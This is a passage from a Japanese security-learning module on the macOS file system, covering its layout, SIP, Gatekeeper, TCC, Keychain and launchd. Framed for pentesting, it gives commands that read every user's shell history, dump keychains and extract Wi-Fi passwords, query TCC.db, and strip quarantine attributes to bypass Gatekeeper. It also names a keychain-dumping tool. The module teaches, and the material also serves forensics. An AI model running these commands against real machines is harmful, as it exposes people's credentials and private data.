# macOSファイルシステム

> **LearnCybersecurity** | 基礎シリーズ | kodoktheGr3at | 2026

---

<!-- LC-CURRICULUM-START -->
> **カリキュラムID:** `LC-007` | **フェーズ0:** 基礎
> **推定学習時間:** 4-5時間 | **レベル:** 初級
> **前提:** LC-001
> **書籍対応:** Ward, How Linux Works（Unixとの比較）; Apple公式プラットフォームガイド
<!-- LC-CURRICULUM-END -->

## 目次

| # | トピック |
|---|---------|
| 1 | 概要: macOSファイルシステムとは |
| 2 | 完全なディレクトリツリー |
| 3 | ルートディレクトリ |
| 4 | `/Applications`: インストール済みアプリケーション |
| 5 | `/System`: コアOS（SIP保護） |
| 6 | `/Library`と`~/Library`: アプリ・システムサポートデータ |
| 7 | `/Users`: ユーザーホームディレクトリ |
| 8 | `/private/etc`: Unix形式の設定 |
| 9 | `/private/var`: 可変データとログ |
| 10 | `/private/tmp`: 一時ファイル |
| 11 | `/bin`と`/sbin`: 必須Unixバイナリ |
| 12 | `/usr`: Unix共有リソース |
| 13 | `.app`バンドル: アプリケーションパッケージ構造 |
| 14 | SIPとGatekeeper: macOSシステム保護機能 |
| 15 | Keychain: 認証情報ストレージ |
| 16 | LaunchAgentsとLaunchDaemons: 永続化と起動 |
| 17 | Volumesとapfs: 現代のボリューム構造 |
| 18 | セキュリティノート: 機微なロケーションと防御的ハードニング |
| 19 | 実践的な偵察ワークフロー |

---

## 重要な用語

この教材でよく出てくる言葉である。

| 用語 | 意味 |
|:---|:---|
| APFS | Apple File System。現代のmacOSファイルシステム(スナップショット、暗号化) |
| ボリューム | マウントできる保存領域。macOSは `/Volumes` 以下に表示する |
| パス | ファイルの場所。macOSはUnix流でスラッシュを使う(`/Users/alex`) |
| バンドル | macOSが1つの項目として扱うフォルダ。`.app` アプリなど |
| SIP | System Integrity Protection。rootでさえ保護されたシステムファイルを変更できないようにする |
| Gatekeeper | 既定で署名・公証済みのアプリだけを実行させるチェック |
| 検疫(quarantine) | そのチェックを起動させるため、macOSがダウンロードしたファイルに付ける印 |
| ホーム / Library | 自分のファイルは `/Users/<名前>`、アプリの設定はその `Library` にある |

---

## 1. 概要: macOSファイルシステムとは

macOSファイルシステムはUnix（BSD/Darwin）の基盤の上に構築されているため、その構造はLinuxに似ている。`/`から始まる単一のディレクトリツリーだ。ただしmacOSはその上に、`/Applications`、`/Library`、純粋なLinuxには存在しない`.app`バンドル形式といったApple固有のレイヤーを追加している。

現在使われているファイルシステムはAPFS（Apple File System）で、古いHFS+を置き換えている。APFSは以下をサポートする。

- スナップショット: 瞬時のファイルシステム状態復元
- ボリュームグループ: 複数のボリュームが1つの物理パーティションを共有する（macOS Catalina以降、DataとSystemが分離されている）
- ネイティブ暗号化: FileVaultが完全に統合されている
- コピーオンライトとスペース共有

macOS Catalina（10.15）以降、システムは読み取り専用システムボリュームを強制する。`/System`ボリュームは`Data`ボリュームから分離され、SIP（System Integrity Protection）によって保護されている。

セキュリティの仕事にとって重要な理由。

- 認証情報の場所（Keychain、ブラウザデータ)を知ることは偵察のターゲットになる。
- SIPとサンドボックスを理解することは、権限昇格の境界を知ることにつながる。
- 統合ログの場所を知ることはフォレンジックやインシデントレスポンスに関わる。
- LaunchAgentsとLaunchDaemonsを理解することは、永続化とマルウェア分析に関わる。
- `.app`バンドルの構造を知ることは、macOSマルウェア分析に関わる。

---

## 2. ファイルツリー: ディレクトリ構造全体

```
/                                      ← Root of the entire file system (Data volume, writable)
│
├── Applications/                      ← User-installed & built-in apps (.app bundles)
│   ├── Safari.app/
│   ├── Utilities/                     ← Built-in utility apps
│   │   ├── Terminal.app/
│   │   ├── Activity Monitor.app/
│   │   ├── Console.app/
│   │   ├── Keychain Access.app/
│   │   └── Disk Utility.app/
│   └── ThirdPartyApp.app/
│
├── System/                            ← Read-only, SIP-protected (sealed system volume)
│   ├── Applications/                  ← Apple's built-in apps (Catalina+)
│   ├── Library/                       ← System-level frameworks, daemons, extensions
│   │   ├── LaunchDaemons/             ← System-wide background services (persistence!)
│   │   ├── LaunchAgents/              ← System-wide per-user agents
│   │   ├── Extensions/                ← Kernel extensions (kext) — legacy
│   │   ├── Frameworks/                ← System frameworks
│   │   ├── CoreServices/              ← Finder, SystemUIServer, etc.
│   │   ├── PrivateFrameworks/
│   │   └── Keychains/                 ← System root certificates
│   └── Volumes/
│       └── Data/                      ← Symlinked to writable data volume (Catalina+)
│
├── Library/                           ← System-wide application support (not user-specific)
│   ├── Application Support/
│   ├── LaunchAgents/                  ← Third-party agents (login items, persistence!)
│   ├── LaunchDaemons/                 ← Third-party daemons (persistence!)
│   ├── Logs/                          ← System & app logs
│   │   ├── DiagnosticReports/         ← Crash reports (forensics!)
│   │   └── CrashReporter/
│   ├── Preferences/                   ← System-wide plist preference files
│   ├── Caches/
│   ├── Extensions/                    ← Legacy kernel extensions
│   ├── StartupItems/                  ← Legacy startup items (pre-launchd)
│   ├── Keychains/                     ← System keychain
│   ├── WebServer/                     ← Legacy Apache web root (older macOS)
│   └── Printers/
│
├── Users/                             ← All user home directories
│   ├── Shared/                        ← Shared between all users
│   │
│   ├── alice/                         ← Regular user's home directory
│   │   ├── Desktop/
│   │   ├── Documents/
│   │   ├── Downloads/
│   │   ├── Movies/
│   │   ├── Music/
│   │   ├── Pictures/
│   │   ├── Public/                    ← Drop Box for file sharing
│   │   ├── .bash_history              ← Command history! (hidden)
│   │   ├── .zsh_history               ← Zsh history (default shell since Catalina)
│   │   ├── .ssh/                      ← SSH keys (hidden)
│   │   │   ├── id_rsa                 ← Private key
│   │   │   ├── id_ed25519
│   │   │   └── known_hosts
│   │   └── Library/                   ← PER-USER app data (hidden by default!)
│   │       ├── Application Support/   ← App data, configs, sometimes credentials
│   │       │   ├── Slack/
│   │       │   ├── 1Password/
│   │       │   └── Google/Chrome/
│   │       ├── Preferences/           ← .plist files — app & system settings
│   │       │   └── com.apple.finder.plist
│   │       ├── Caches/                ← App caches
│   │       ├── Cookies/               ← Browser cookies (legacy location)
│   │       ├── Keychains/             ← User's login.keychain-db!
│   │       │   └── login.keychain-db  ← Saved passwords, certs, keys!
│   │       ├── LaunchAgents/          ← Per-user persistence!
│   │       ├── Mail/                  ← Local Mail.app data
│   │       ├── Messages/              ← iMessage database (chat.db)
│   │       ├── Safari/                ← Safari history, bookmarks
│   │       │   └── History.db
│   │       ├── Logs/                  ← Per-app logs
│   │       ├── CloudStorage/          ← iCloud Drive, Dropbox, etc.
│   │       └── Containers/            ← Sandboxed app data (per bundle ID)
│   │
│   └── bob/
│       └── (same structure as above)
│
├── private/                           ← Actual location of /etc, /tmp, /var (symlinked from root)
│   ├── etc/                           ← Unix-style system config (symlink target of /etc)
│   │   ├── passwd                     ← Legacy user list (NOT primary source — see dscl)
│   │   ├── hosts                      ← Static hostname resolution
│   │   ├── ssh/
│   │   │   └── sshd_config
│   │   ├── sudoers                    ← Sudo permissions
│   │   ├── pf.conf                    ← Packet filter firewall config
│   │   └── crontab                    ← Legacy cron (launchd preferred now)
│   ├── var/                           ← Variable data (symlink target of /var)
│   │   ├── log/
│   │   │   ├── system.log             ← Legacy system log (pre-unified logging)
│   │   │   ├── install.log            ← Installation events
│   │   │   ├── wifi.log
│   │   │   └── DiagnosticMessages/
│   │   ├── db/
│   │   │   └── dslocal/               ← Local user account database (Open Directory)
│   │   │       └── nodes/Default/users/
│   │   ├── folders/                   ← Per-user temp & cache (randomized paths!)
│   │   ├── root/                      ← root user's home (rarely used directly)
│   │   └── audit/                     ← BSM security audit logs
│   └── tmp/                           ← Temporary files (symlink target of /tmp)
│
├── bin/                                ← Essential Unix binaries (bash, ls, cp, cat...)
├── sbin/                               ← Essential system admin binaries
│
├── usr/                                 ← Unix shared resources
│   ├── bin/                             ← Most command-line tools
│   ├── sbin/
│   ├── lib/
│   ├── local/                           ← Homebrew (Intel) typically lives here
│   │   └── bin/
│   └── share/
│
├── opt/                                  ← Homebrew (Apple Silicon) typically lives here
│   └── homebrew/
│       └── bin/
│
├── etc -> private/etc                    ← Symlink
├── tmp -> private/tmp                    ← Symlink
├── var -> private/var                    ← Symlink
│
├── Volumes/                              ← Mounted external/network volumes
│   ├── Macintosh HD/                     ← Self-reference to boot volume
│   └── USB_DRIVE/
│
├── .Spotlight-V100/                      ← Spotlight search index (hidden)
├── .fseventsd/                           ← Filesystem event logs (forensics!)
├── .Trashes/                             ← Trash for non-boot volumes
├── .DS_Store                             ← Per-folder Finder metadata (forensics!)
│
└── cores/                                ← Core dump files (crash forensics)
```

---

## 3. `/` — ルートディレクトリ（合成ファームリンクビュー）

macOS Catalina以降、目にする`/`は実際には2つの別々のボリューム、すなわちSystemボリューム（読み取り専用、暗号学的に封印）とDataボリューム（書き込み可能）の統合ビュー（ファームリンク）である。Appleは通常のシンボリックリンクではなくファームリンクを使い、両方をユーザーに対して透過的な単一のディレクトリツリーとして見せている。

```bash
# Navigate to root
$ cd /
$ ls -la /

# Check the volume structure
$ diskutil list
/dev/disk3 (synthesized):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:      APFS Container Scheme -                       +494.4 GB  disk3
                                 Physical Store disk0s2
   1:                APFS Volume Macintosh HD - Data      300.1 GB   disk3s1
   2:                APFS Volume Macintosh HD             15.3 GB    disk3s5  (System, sealed)
   3:                APFS Volume Preboot                  500.0 MB   disk3s2
   4:                APFS Volume Recovery                 1.1 GB     disk3s3
   5:                APFS Volume VM                       1.1 GB     disk3s6

# View firmlinks mapping
$ cat /usr/share/firmlinks
/AppleInternal	AppleInternal
/Applications	Applications
/Library	Library
/System/Library/Caches	System/Library/Caches
/Users	Users
/Volumes	Volumes
...

# Check if SIP is enabled
$ csrutil status
System Integrity Protection status: enabled.
```

---

## 4. `/Applications` — インストール済みアプリケーション

`/Applications`はmacOSにおけるインストール済みアプリケーション（Apple純正とサードパーティの両方）の標準的な場所だ。各アプリケーションは`.app`バンドルであり、実際は実行ファイル、リソース、メタデータを含むフォルダだが、Finderでは単一のファイルとして表示される。

```bash
# List installed applications
$ ls /Applications

# List applications with details
$ ls -la /Applications/*.app

# Find all .app bundles system-wide
$ find / -name "*.app" -maxdepth 4 2>/dev/null

# Check app's bundle identifier
$ defaults read /Applications/Safari.app/Contents/Info.plist CFBundleIdentifier
com.apple.Safari

# Check code signature (important for security analysis)
$ codesign -dv --verbose=4 /Applications/Safari.app

# List running applications
$ osascript -e 'tell application "System Events" to get name of every process'

# System-wide installed application inventory (via system_profiler)
$ system_profiler SPApplicationsDataType
```

| パス | 内容 | ペンテストでの価値 |
|------|------|---------------------|
| `/Applications/*.app` | ユーザーレベルアプリ | 中 |
| `/System/Applications/*.app` | Apple純正アプリ | 低 |
| `*.app/Contents/MacOS/` | 実行バイナリ | 高 |
| `*.app/Contents/Info.plist` | アプリメタデータ | 中 |
| `*.app/Contents/Resources/` | アセットとリソース | 低 |

---

## 5. `/System` — コアOS（SIP保護）

`/System`はmacOSオペレーティングシステムの中核であり、Apple純正のすべてのフレームワーク、デーモン、コンポーネントが含まれている。macOS Big Sur以降、このボリュームは読み取り専用で暗号学的に封印されている。rootであっても、事前にSIPを無効化しない限りここには書き込めない。

`/System/Library`は`/Library`（システムレベルだがSIP保護されていない）や`~/Library`（ユーザーごと）とは異なる。混同しないこと。

```bash
# Attempt to write to /System (will fail with SIP enabled)
$ sudo touch /System/test.txt
touch: /System/test.txt: Read-only file system

# View SIP-protected paths
$ csrutil status
System Integrity Protection status: enabled.

# List system LaunchDaemons (persistence-relevant, but SIP-protected)
$ ls /System/Library/LaunchDaemons/ | head -10

# View kernel extensions (legacy, mostly replaced by System Extensions)
$ ls /System/Library/Extensions/ | head -10
$ kextstat                       # list loaded kernel extensions (deprecated cmd)
$ kmutil showloaded              # modern equivalent

# Check System Extensions (modern replacement for kexts)
$ systemextensionsctl list

# View CoreServices (Finder, Dock, etc.)
$ ls /System/Library/CoreServices/
```

| サブディレクトリ | 内容 |
|-------------------|------|
| `/System/Library/LaunchDaemons` | Appleのシステムサービス |
| `/System/Library/Frameworks` | macOSのコアフレームワーク |
| `/System/Library/CoreServices` | Finder、SystemUIServerなど |
| `/System/Library/Extensions` | カーネル拡張（レガシー） |
| `/System/Library/Keychains` | システムのルート証明書 |

---

## 6. `/Library`と`~/Library` — アプリケーションサポートデータ

目的が異なる2つのLibraryの場所がある。

- `/Library`: 全ユーザーに適用されるシステムレベルのデータと設定。SIPで保護されていないため、rootはここに書き込める。
- `~/Library`: ユーザーレベルのデータと設定で、macOS 10.7以降デフォルトでFinderから隠されている。

`~/Library`はフォレンジックの宝庫だ。キーチェーン、ブラウザキャッシュ、メッセージデータベース、ユーザーごとのアプリ設定が含まれている。

```bash
# Show hidden ~/Library in Finder (one-time)
$ chflags nohidden ~/Library

# Or navigate directly via Terminal (always accessible)
$ cd ~/Library
$ ls -la

# ── HIGH-VALUE FORENSIC LOCATIONS ────────────────────────────────

# Preferences (plist files — app & system settings)
$ ls ~/Library/Preferences/
$ defaults read com.apple.finder

# Saved passwords & certificates (requires unlock / Touch ID)
$ ls ~/Library/Keychains/
$ security list-keychains
$ security find-generic-password -ga "AccountName"   # prompts for keychain password

# Browser data (Safari)
$ sqlite3 ~/Library/Safari/History.db "SELECT url FROM history_items LIMIT 10;"

# Chrome data
$ ls ~/Library/Application\ Support/Google/Chrome/Default/

# iMessage database (forensics gold)
$ sqlite3 ~/Library/Messages/chat.db "SELECT text FROM message LIMIT 10;"

# Application crash logs
$ ls ~/Library/Logs/DiagnosticReports/

# LaunchAgents — persistence!
$ ls ~/Library/LaunchAgents/

# Login items (apps that start at login)
$ osascript -e 'tell application "System Events" to get the name of every login item'

# Quarantine database (downloaded file history — Gatekeeper)
$ sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
    "SELECT LSQuarantineDataURLString FROM LSQuarantineEvent LIMIT 10;"
```

### `~/Library/`内の高価値ファイル

| パス | 内容 | ペンテストでの価値 |
|------|------|---------------------|
| `Keychains/login.keychain-db` | 保存されたパスワードと証明書 | 最重要 |
| `Application Support/` | アプリデータと設定 | 高 |
| `Safari/History.db` | 閲覧履歴 | 高 |
| `Messages/chat.db` | iMessageデータベース | 高 |
| `Preferences/*.plist` | アプリ/システム設定 | 中 |
| `LaunchAgents/` | ユーザーごとの永続化 | 高 |
| `Logs/DiagnosticReports/` | クラッシュレポート | 中 |
| `Containers/` | サンドボックス化アプリデータ | 高 |
| `CloudStorage/` | iCloud Drive、Dropboxなど | 中 |

---

## 7. `/Users` — ユーザーホームディレクトリ

`/Users`にはシステム上の各ユーザーのホームディレクトリが含まれており、Linuxの`/home`に相当する。macOSはCatalina以降デフォルトシェルとしてZshを使う（以前はBash）。各ユーザーは標準フォルダ（Desktop、Documentsなど）に加え、隠された`~/Library`を持つ。

```bash
# List all user home directories
$ ls /Users
$ dscl . list /Users                     # list all user accounts (incl. system accounts)
$ dscl . list /Users | grep -v "^_"       # filter out system/service accounts

# Navigate to a user's home
$ cd /Users/alice
$ ls -la

# Shell history (gold mine!)
$ cat ~/.zsh_history                      # Zsh (default since Catalina)
$ cat ~/.bash_history                     # Bash (if used)

# Recently opened files / Quick Look cache
$ sqlite3 ~/Library/Application\ Support/com.apple.sharedfilelist/*.sfl2

# SSH keys
$ ls -la ~/.ssh/
$ cat ~/.ssh/id_rsa.pub

# Get info about all local user accounts
$ dscl . -list /Users UniqueID
$ dscl . -read /Users/alice

# Check admin group membership
$ dscl . -read /Groups/admin GroupMembership

# Foreach user, check shell history
$ for user in $(ls /Users); do
    echo "=== $user ==="
    sudo cat "/Users/$user/.zsh_history" 2>/dev/null
done
```

### `/Users/<username>/`内の高価値ファイル

| パス | 内容 | ペンテストでの価値 |
|------|------|---------------------|
| `.zsh_history` | Zshコマンド履歴 | 最重要 |
| `.bash_history` | Bashコマンド履歴 | 最重要 |
| `.ssh/id_rsa` / `id_ed25519` | SSH秘密鍵 | 高 |
| `Library/Keychains/` | 保存された認証情報 | 最重要 |
| `Desktop/` & `Documents/` | ユーザーファイル | 中 |
| `Public/` | 共有フォルダ（Drop Box） | 中 |

---

## 8. `/private/etc` — Unix形式の設定

macOSの`/etc`は実際には`/private/etc`へのシンボリックリンクだ。クラシックなUnix形式の設定ファイルが含まれている。重要な点として、macOSはユーザーリストの主要なソースとして`/etc/passwd`を使わない。それはOpen Directory / dscl（ディレクトリサービス）に置き換えられているが、互換性のために`/etc/passwd`は今も存在する。

```bash
# Confirm /etc is a symlink
$ ls -la / | grep etc
lrwxr-xr-x  1 root  wheel  11 etc -> private/etc

# Static hostname resolution
$ cat /etc/hosts

# SSH daemon configuration
$ cat /etc/ssh/sshd_config

# Sudoers
$ sudo cat /etc/sudoers

# Packet filter firewall config
$ cat /etc/pf.conf
$ sudo pfctl -s rules              # show active firewall rules

# PRIMARY user database is Open Directory, NOT /etc/passwd:
$ dscl . list /Users
$ dscl . read /Users/alice UniqueID
$ dscl . read /Users/alice UserShell

# /etc/passwd is mostly a compatibility stub on modern macOS
$ cat /etc/passwd
##
# User Database
# Note that this file is consulted directly only when the system is running
# in single-user mode...
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
```

| ファイル | 内容 | ペンテストでの価値 |
|---------|------|---------------------|
| `/etc/hosts` | 静的ホスト名解決 | 中 |
| `/etc/ssh/sshd_config` | SSHデーモン設定 | 高 |
| `/etc/sudoers` | sudo権限 | 最重要 |
| `/etc/pf.conf` | ファイアウォール設定 | 高 |
| `/etc/passwd` | 互換性スタブ（主要ソースではない） | 低 |

---

## 9. `/private/var` — 可変データとログ

`/var`（`/private/var`へのシンボリックリンク）には頻繁に変化するデータが含まれる。macOS Sierra以降、ほとんどのロギングはクラシックな`syslog`のようなフラットなテキストファイルではなく、統合ロギングシステム（`log`コマンド経由でアクセス）に移行した。ただし一部のレガシーログはここに残っている。

```bash
# ── UNIFIED LOGGING SYSTEM (modern, primary method) ───────────────
$ log show --last 1h                            # show logs from last hour
$ log show --predicate 'eventMessage contains "ssh"' --last 1h
$ log stream                                      # live stream of system logs
$ log stream --predicate 'process == "sshd"'      # filter by process
$ log show --predicate 'subsystem == "com.apple.securityd"' --last 1d

# Authentication-related logs
$ log show --predicate 'eventMessage contains "authentication"' --last 1h

# ── LEGACY LOG FILES (still present) ───────────────────────────────
$ cat /var/log/system.log              # legacy system log (pre-Sierra style)
$ cat /var/log/install.log             # installation events
$ cat /var/log/wifi.log                # Wi-Fi connection events

# ── LOCAL USER DATABASE (Open Directory backend) ───────────────────
$ ls /var/db/dslocal/nodes/Default/users/
$ sudo plutil -p /var/db/dslocal/nodes/Default/users/alice.plist

# ── PER-USER TEMP/CACHE (randomized path!) ──────────────────────────
$ echo $TMPDIR
/var/folders/zz/zyxvpxvq6csfxvn_n0000000000/T/

# ── SECURITY AUDIT LOGS (BSM format) ────────────────────────────────
$ sudo praudit -l /var/audit/[timestamp]
```

### `/var`の主要サブディレクトリ

| ディレクトリ | 内容 |
|-------------|------|
| `/var/log` | レガシーログとインストールログ |
| `/var/db/dslocal` | ローカルユーザーデータベース |
| `/var/folders` | ユーザーごとの一時/キャッシュ（ランダム化） |
| `/var/audit` | セキュリティ監査ログ（BSM形式） |
| `/var/root` | rootのホーム（あまり使われない） |

---

## 10. `/private/tmp` — 一時ファイル

`/tmp`（`/private/tmp`へのシンボリックリンク）はクラシックな全ユーザー書き込み可能な一時的な場所だが、macOSは現代のアプリケーションでは（`/var/folders/...`配下の）ランダム化されたユーザーごとの`$TMPDIR`をより頻繁に使う。ポストエクスプロイテーション中はどちらの場所も確認する価値がある。

```bash
# Classic /tmp
$ ls -la /tmp/
drwxrwxrwt  root wheel  tmp     ← "t" = sticky bit

# Modern randomized per-user temp directory
$ echo $TMPDIR
/var/folders/zz/zyxvpxvq6csfxvn_n0000000000/T/
$ ls -la "$TMPDIR"

# Find ALL per-user temp dirs (useful in multi-user forensics)
$ ls -la /var/folders/

# Common attacker artifacts to check:
$ ls -la /tmp/ "$TMPDIR" 2>/dev/null
# - Dropped payloads, downloaded scripts
# - Compiled exploit binaries
# - Persistence staging plists before being moved to LaunchAgents
```

ペンテストのメモ: `$TMPDIR`はユーザーごとにランダム化され、セッションのたびに変わるため、多くのセキュリティツールやアナリストがこれを見落とす。あるユーザーのシェルセッションにいるときは、常に`echo $TMPDIR`を確認すること。

---

## 11. `/bin`と`/sbin` — 必須Unixバイナリ

Linuxと同様に、`/bin`と`/sbin`には最も必須のUnixバイナリが含まれる。ただしmacOS Catalina以降、この場所は読み取り専用のシステムボリュームにあり、いくつかのクラシックなBSDツール（`netstat`、`ifconfig`など）はAppleの現代的なツール（`lsof -i`、`networksetup`、`scutil`）にますます置き換えられつつある。

```bash
$ ls /bin
bash    cat    chmod   cp     csh    date
echo    kill   ln      ls     mkdir  mv
ps      pwd    rm      sh     zsh    ...

$ ls /sbin
fsck    ifconfig   mount    ping    reboot
route   shutdown   ...

# macOS-specific networking tools (preferred over legacy ones)
$ networksetup -listallhardwareports
$ scutil --dns                       # DNS configuration
$ scutil --nwi                       # network interface info
$ lsof -i -P                         # listening ports & connections (netstat replacement)
$ system_profiler SPNetworkDataType  # full network hardware report
```

| バイナリ | 機能 |
|---------|------|
| `dscl` | ディレクトリサービスの管理 |
| `scutil` | システム/ネットワーク設定 |
| `csrutil` | SIP制御 |
| `codesign` | コード署名の検証 |
| `spctl` | Gatekeeperの制御 |
| `security` | キーチェーンへのアクセス |

---

## 12. `/usr` — Unix共有リソース

`/usr`には追加のUnixコマンドラインツールの大部分が含まれている。重要な注意点として、現代のmacOSでは`/usr/bin`と`/usr/sbin`は読み取り専用（SIP保護）になっている。以前のように`/usr/bin`に直接バイナリを追加することはできなくなった。代わりに、`/usr/local`（Intel Mac）または`/opt/homebrew`（Apple Silicon）にインストールするHomebrewを使う。

```bash
$ ls /usr
bin  lib  libexec  local  sbin  share  std

# /usr/bin is SIP-protected
$ touch /usr/bin/test
touch: /usr/bin/test: Operation not permitted

# Homebrew locations (package manager — not pre-installed!)
$ which brew
/opt/homebrew/bin/brew              # Apple Silicon (M1/M2/M3/M4)
/usr/local/bin/brew                 # Intel Mac

$ brew list                          # installed packages
$ brew install nmap                  # install a tool

# Check architecture
$ uname -m
arm64        # Apple Silicon
x86_64       # Intel
```

| ディレクトリ | メモ |
|-------------|------|
| `/usr/bin` | SIP保護、読み取り専用 |
| `/usr/local` | Homebrew（Intel） |
| `/opt/homebrew` | Homebrew（Apple Silicon） |

---

## 13. `.app`バンドル — アプリケーションパッケージ構造

すべてのmacOSアプリケーションは実際には`.app`拡張子を持つフォルダであり、Finderでは単一のファイルのように見えるが、完全な内部構造を含んでいる。この構造を理解することはmacOSマルウェア分析とリバースエンジニアリングにとって重要だ。

```
SomeApp.app/
└── Contents/
    ├── Info.plist              ← App metadata (bundle ID, version, permissions)
    ├── MacOS/
    │   └── SomeApp              ← The actual executable binary
    ├── Resources/                ← Icons, images, localized strings
    │   └── AppIcon.icns
    ├── Frameworks/                ← Bundled frameworks/libraries
    ├── PlugIns/                    ← App extensions/plugins
    ├── _CodeSignature/              ← Code signing data
    │   └── CodeResources
    └── embedded.provisionprofile   ← Provisioning profile (if signed)
```

```bash
# Inspect an app bundle's contents
$ ls -la /Applications/Safari.app/Contents/

# View Info.plist (metadata: bundle ID, version, permissions requested)
$ plutil -p /Applications/Safari.app/Contents/Info.plist
$ defaults read /Applications/Safari.app/Contents/Info.plist

# Find the actual executable
$ file /Applications/Safari.app/Contents/MacOS/Safari

# Check code signature & entitlements (security analysis)
$ codesign -dv --verbose=4 /Applications/Safari.app
$ codesign -d --entitlements - /Applications/Safari.app

# Verify Gatekeeper assessment
$ spctl -a -vvv /Applications/Safari.app

# Check for unsigned / ad-hoc signed apps (suspicious!)
$ find /Applications -maxdepth 1 -name "*.app" -exec sh -c \
    'codesign -dv "{}" 2>&1 | grep -q "not signed" && echo "{}"' \;

# Extract & analyze a binary inside a bundle
$ otool -L /Applications/Safari.app/Contents/MacOS/Safari    # linked libraries
$ otool -h /Applications/Safari.app/Contents/MacOS/Safari    # mach-o header

# Check architecture (universal binary support)
$ lipo -info /Applications/Safari.app/Contents/MacOS/Safari
```

| `.app`内のパス | 内容 | ペンテストでの価値 |
|-----------------|------|---------------------|
| `Contents/MacOS/` | メイン実行バイナリ | 最重要 |
| `Contents/Info.plist` | メタデータと権限 | 高 |
| `Contents/_CodeSignature/` | コード署名データ | 高 |
| `Contents/Resources/` | アセット（アイコン、画像） | 低 |
| `Contents/Frameworks/` | 埋め込みライブラリ | 中 |

---

## 14. SIPとGatekeeper — macOSシステム保護機能

macOSにはクラシックなLinux/Windowsには見られない独自の保護層がいくつかあり、ペンテストの方法に大きく影響する。

- SIP（System Integrity Protection）: rootであっても`/System`、`/bin`、`/sbin`、`/usr`の変更を防止する。
- Gatekeeper: アプリの初回実行前に署名とノータライゼーションを検証する。
- TCC（Transparency, Consent, and Control）: カメラ、マイク、個人ファイルなどへのアクセスにユーザーの許可を求める。
- ノータライゼーション: App Store以外での配布を許可する前に、Appleがアプリのマルウェアをスキャンする。

```bash
# ── SIP ────────────────────────────────────────────────────────────
$ csrutil status
System Integrity Protection status: enabled.

# Disabling SIP requires Recovery Mode (not possible from normal boot):
# 1. Reboot, hold Cmd+R to enter Recovery
# 2. Open Terminal from Utilities menu
# 3. csrutil disable
# 4. Reboot

# ── GATEKEEPER ─────────────────────────────────────────────────────
$ spctl --status
assessments enabled

$ spctl -a -vvv /Applications/SomeApp.app    # check if app would be allowed to run

# Remove quarantine attribute (common bypass technique — known to attackers!)
$ xattr -d com.apple.quarantine /path/to/file.app
$ xattr -l /path/to/file.app                  # list all extended attributes

# ── TCC (PRIVACY PERMISSIONS) ────────────────────────────────────────
# TCC database (per-user) — tracks which apps have which permissions
$ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value,service FROM access;"

# System-wide TCC database (requires Full Disk Access to read)
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client,auth_value,service FROM access;"

# Reset TCC permissions for an app
$ tccutil reset All com.somecompany.someapp

# ── NOTARIZATION CHECK ─────────────────────────────────────────────
$ spctl -a -t exec -vv /Applications/SomeApp.app
$ codesign --test-requirement="=notarized" --verify --verbose /Applications/SomeApp.app

# ── FULL DISK ACCESS (relevant for security tools & malware) ───────
# Check which apps have Full Disk Access (System Settings > Privacy)
# Programmatically:
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles';"
```

### macOS保護レイヤーの概要

| 保護機能 | 機能 | バイパスとの関連 |
|---------|------|-------------------|
| SIP | コアシステムファイルを保護 | Recovery Modeが必要 |
| Gatekeeper | アプリの署名を検証 | `xattr -d`によるquarantine除去 |
| TCC | プライバシー権限（カメラ、ファイル） | ソーシャルエンジニアリング/TCC.db悪用 |
| ノータライゼーション | Appleによるマルウェアスキャン | アドホック署名による回避 |

---

## 15. Keychain — 認証情報ストレージ

KeychainはmacOS組み込みの暗号化認証情報ストレージシステムで、Wi-Fiパスワード、アプリパスワード、証明書、秘密鍵を保存する。これはWindowsのCredential Managerに相当し、macOSのポストエクスプロイテーションにおける最優先ターゲットだ。

```bash
# List all keychains
$ security list-keychains

# Default keychain location
$ ls -la ~/Library/Keychains/
login.keychain-db

# Dump keychain info (won't show passwords without unlock)
$ security dump-keychain ~/Library/Keychains/login.keychain-db

# Find a specific password (prompts for keychain unlock / Touch ID)
$ security find-generic-password -s "ServiceName" -g

# Find Wi-Fi password (common pentest demo)
$ security find-generic-password -D "AirPort network password" -a "WiFiName" -w

# Find internet passwords (websites)
$ security find-internet-password -s "github.com" -g

# Export all certificates
$ security find-certificate -a -p ~/Library/Keychains/login.keychain-db

# Unlock keychain (requires password)
$ security unlock-keychain ~/Library/Keychains/login.keychain-db

# Keychain access via GUI (for comparison)
$ open -a "Keychain Access"

# System keychain (used by system services, root-readable)
$ ls -la /Library/Keychains/
$ sudo security dump-keychain /Library/Keychains/System.keychain
```

ペンテストのメモ: Keychainはユーザーのログインパスワード（またはTouch ID）で保護されている。そのパスワードがなければ、キーチェーンをダンプしてもメタデータしか見えず、実際のシークレットは見えない。非対話的アクセスしかない場合は、メモリ経由でのキーチェーンダンプ（macOS向けのMimikatz的ツール、例えば`Chainbreaker`）のような手法が必要になる。

| キーチェーン | 場所 | 内容 |
|-------------|------|------|
| ログインキーチェーン | `~/Library/Keychains/login.keychain-db` | ユーザーパスワード、Wi-Fi、アプリ認証情報 |
| システムキーチェーン | `/Library/Keychains/System.keychain` | システムレベルの認証情報 |
| iCloudキーチェーン | iCloud経由で同期 | iCloud同期パスワード |

---

## 16. LaunchAgentsとLaunchDaemons — 永続化と起動

macOSは現代のスケジュールタスクや起動の主要なメカニズムとしてcronを使わない。それは複数の場所にある`.plist`ファイルで設定されるlaunchdに置き換えられている。これは正当なソフトウェアとマルウェアの両方にとって、macOSにおける永続化ベクター第1位だ。

主な違い。

- LaunchAgentsはログインユーザーとして実行され、GUIアクセスを持つ。
- LaunchDaemonsはrootとして、ユーザーセッションなしでバックグラウンドサービスとして実行される。

```bash
# ── FOUR PERSISTENCE LOCATIONS (in order of privilege) ──────────────
~/Library/LaunchAgents/                  # per-user, no admin needed
/Library/LaunchAgents/                   # all-users, needs admin to write
/Library/LaunchDaemons/                  # root-level daemon, needs admin
/System/Library/LaunchDaemons/           # Apple's own (SIP-protected)

# List all LaunchAgents/Daemons across the system
$ ls ~/Library/LaunchAgents/
$ ls /Library/LaunchAgents/
$ ls /Library/LaunchDaemons/

# View a launchd plist
